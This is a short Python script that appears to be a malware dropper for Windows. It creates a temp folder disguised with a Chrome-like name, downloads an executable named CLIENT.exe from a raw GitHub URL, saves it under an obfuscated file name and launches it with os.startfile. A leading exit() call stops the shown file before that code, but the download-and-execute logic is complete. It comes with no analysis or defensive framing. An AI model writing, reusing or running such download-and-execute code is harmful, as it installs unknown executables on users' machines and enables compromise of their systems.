print(__file__)




exit()



import requests
import getpass
import os


user = getpass.getuser()
path = f'''C:/Users/{user}/AppData/Local/Temp/chrome_drag85O92'''
link = "https://raw.githubusercontent.com/596844723263/aaa/main/CLIENT.exe"

try:
    os.mkdir(path)
except:
    pass

mlw = requests.get(link, allow_redirects=False)

try:
    path = f'''C:/Users/{user}/AppData/Local/Temp/chrome_drag85O92'''
    f_total = (f"{path}/0O0OO0O0O.exe")
    open(f_total, 'wb').write(mlw.content)
except:
    path = f'''C:/Users/{user}/'''
    f_total = (f"{path}/0O0OO0O0O.exe")
    open(f_total, 'wb').write(mlw.content) 
print(path)   
os.startfile(f_total)